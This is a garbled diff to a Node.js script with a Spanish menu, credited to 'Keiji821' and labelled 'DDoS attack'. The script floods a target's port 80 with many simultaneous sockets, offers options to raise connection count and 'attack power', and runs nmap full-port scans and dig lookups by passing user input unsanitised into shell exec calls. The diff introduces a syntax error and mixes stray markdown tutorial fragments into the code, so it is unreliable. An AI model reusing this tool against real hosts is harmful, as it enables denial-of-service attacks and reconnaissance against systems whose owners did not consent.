@@ -40,6 +40,32 @@ const decorations = {
   italic: '[3m',
 };
 
+const async = require('async');
+const axios = require('axios');
+const geoip = require('geoip-lite');
+const { exec } = require('child_process');
+
+const showMenu = () => {
+  console.clear();
+  console.log('[31m         DDoS attack    ');
+  console.log('⭐️ Desarrollado por Keiji821');
+  console.log('[36m ⸂⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⸃');
+  console.log('[32m ︳1. Iniciar ataque DDoS                ︳');
+  console.log('[34m ︳2. Actualizar código                  ︳');
+  console.log('[36m ︳3. Configurar conexiones simultaneas  ︳');
+  console.log('[33m ︳4. Aumentar potencia del ataque       ︳');
+  console.log('[31m ︳5. Sacar información de IP            ︳');
+  console.log('[31m ︳6. Análisis de IP                     ︳');
+  console.log('[31m ︳7. Información geográfica de IP       ︳');
+  console.log('[31m ︳8. Salir                              ︳');
+  console.log('[36m ⸌⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎺⸍');
+  rl.setPrompt('[37m  🌐➤ ');
+  rl.prompt();
+};
+
+let numConnections = 100; // Número de conexiones simultaneas por defecto
+let attackDuration = 60; // Duración del ataque por defecto
+
 const ddosAttack = async (url, numConnections, attackDuration) => {
 try {
 console.log(`[36m Iniciando ataque DDoS...`);
@@ -47,8 +73,7 @@ const sockets = [];
 for (let i = 0; i < numConnections; i++) {
 const socket = new net.Socket();
 socket.connect(80, url, () => {
-console.log(`[31m Conectado a ${url}`);
-});
+console.log(`[31m Conectado a ${url}`););
 socket.on('data', (data) => {
 console.log(`Dato recibido de ${url}`);
 });
@@ -83,14 +108,8 @@ console.error(`Error: ${error}`);
 }
 };
 
-const async = require('async');
-const axios = require('axios');
-const geoip = require('geoip-lite');
-const nmap = require('nmap');
-
 const getInfo = async (ip) => {
 try {
-const exec = require('child_process').exec;
 const command = `dig +nocmd ${ip} any +multiline`;
 exec(command, (error, stdout, stderr) => {
 if (error) {
@@ -118,23 +137,21 @@ console.error(`Error: ${error.message}`);
 
 const analyzeIP = async (ip) => {
 try {
-const scanner = new nmap.Scanner(ip);
-scanner.on('complete', (data) => {
-const details = [];
-for (const item of data.hosts) {
-details.push(`Host: ${item.ip}`);
-details.push(`OS: ${item.os}`);
-details.push(`Ports: ${item.ports}`);
+const command = `nmap -sT -p- ${ip}`;
+exec(command, (error, stdout, stderr) => {
+if (error) {
+console.error(`Error: ${error.message}`);
+return;
 }
-console.log(details.join(String.raw`
-`));
+console.log(stdout);
 });
-scanner.scan();
 } catch (error) {
 console.error(`Error: ${error.message}`);
 }
 };
-
+```
+** Paso 8: Definir función `getGeoIP` **
+```
 const getGeoIP = async (ip) => {
 try {
 const response = await axios.get(`http://api.geonames.org/findNearbyPlaceByNameJSON?lat=&lng=&username=demo&ip=${ip}`);
@@ -152,29 +169,6 @@ console.log('No se encontró información geográfica para esa IP');
 console.error(`Error: ${error.message}`);
 }
 };
-
-const showMenu = () => {
-console.clear();
-console.log('[31m         DDoS attack    ');
-console.log('⭐️ Desarrollado por Keiji821');
-console.log('[36m ⸂⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⸃');
-console.log('[32m ︳1. Iniciar ataque DDoS                ︳');
-console.log('[34m ︳2. Actualizar código                  ︳');
-console.log('[36m ︳3. Configurar conexiones simultaneas  ︳');
-console.log('[33m ︳4. Aumentar potencia del ataque       ︳');
-console.log('[31m ︳5. Sacar información de IP            ︳');
-console.log('[31m ︳6. Análisis de IP                     ︳');
-console.log('[31m ︳7. Información geográfica de IP       ︳');
-console.log('[31m ︳8. Salir                              ︳');
-console.log('[36m ⸌⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎺⸍');
-rl.setPrompt('[37m  🌐➤ ');
-rl.prompt();
-};
-
-let numConnections = 100; // Número de conexiones simultaneas por defecto
-let attackDuration = 60; // Duración del ataque por defecto
-
-showMenu(); // Mostrar el menú principal al inicio
 
 rl.on('line', (option) => {
 switch (option.trim()) {
@@ -260,6 +254,9 @@ case '8':
 console.log('Saliendo...');
 process.exit();
 break;
+default:
+console.log('Opción invalida');
+showMenu();
 }
 }).on('close', () => {
 process.exit();
